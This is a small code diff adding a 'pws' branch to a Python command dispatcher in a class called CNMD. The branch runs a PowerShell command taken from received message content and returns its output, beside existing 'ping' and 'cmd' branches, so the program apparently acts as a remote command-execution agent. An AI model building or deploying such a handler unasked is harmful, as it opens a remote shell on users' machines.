@@ -336,6 +336,13 @@ class CNMD():
                             if sys_cmd[1] == 'ping':
                                 cmd = webgrab.ping(sys_cmd[2])
                                 self.msg_stack.append(f'[D] command [ping] [{sys_cmd[2]}] excuted')
+                        elif sys_cmd[0] == 'pws':
+                            print(sys_cmd)
+                            runcmd.cmd_output=''
+                            runcmd.pws(content.split('$$$')[1][4:])
+                            self.msg_stack.append(f'[D] command [{sys_cmd[1]}] excuted')
+                            time.sleep(5)
+                            cmd = copy.deepcopy(runcmd.cmd_output)
                         elif sys_cmd[0] == 'cmd':
                             if sys_cmd[1] == '-i':
                                 runcmd.cmd_output=''
